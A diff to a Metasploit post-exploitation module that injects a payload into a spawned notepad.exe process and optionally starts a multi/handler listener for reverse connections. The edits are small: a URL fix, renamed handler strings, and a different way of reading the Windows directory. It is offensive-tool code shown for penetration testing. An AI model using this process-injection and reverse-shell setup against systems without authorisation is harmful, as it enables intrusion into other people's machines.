@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Post
         OptAddress.new('LHOST', [true, 'IP of host that will receive the connection from the payload.']),
         OptInt.new('LPORT', [false, 'Port for Payload to connect to.', 4433]),
         OptInt.new('PID', [false, 'Process Identifier to inject of process to inject payload.']),
-        OptBool.new('HANDLER', [ false, 'Start an Exploit Multi Handler to receive the connection', false]),
+        OptBool.new('HANDLER', [ false, 'Start an exploit/multi/handler to receive the connection', false]),
         OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format."]),
         OptInt.new('AMOUNT',  [false, 'Select the amount of shells you want to spawn.', 1])
         ], self.class)
@@ -112,9 +112,9 @@ class Metasploit3 < Msf::Post
     return pay
   end
 
-  # Starts a multi/handler session
+  # Starts a exploit/multi/handler session
   def create_multihand(pay,pay_name,lhost,lport)
-    print_status("Starting exploit multi handler")
+    print_status("Starting exploit/multi/handler")
     if not check_for_listner(lhost,lport)
       # Set options for module
       mul = client.framework.exploits.create("multi/handler")
@@ -159,7 +159,7 @@ class Metasploit3 < Msf::Post
   # Creates a temp notepad.exe to inject payload in to given the payload
   # Returns process PID
   def create_temp_proc(pay)
-    windir = client.fs.file.expand_path("%windir%")
+    windir = client.sys.config.getenv('windir')
     # Select path of executable to run depending the architecture
     if pay.arch.join == "x86" and client.platform =~ /x86/
       cmd = "#{windir}\\System32\\notepad.exe"
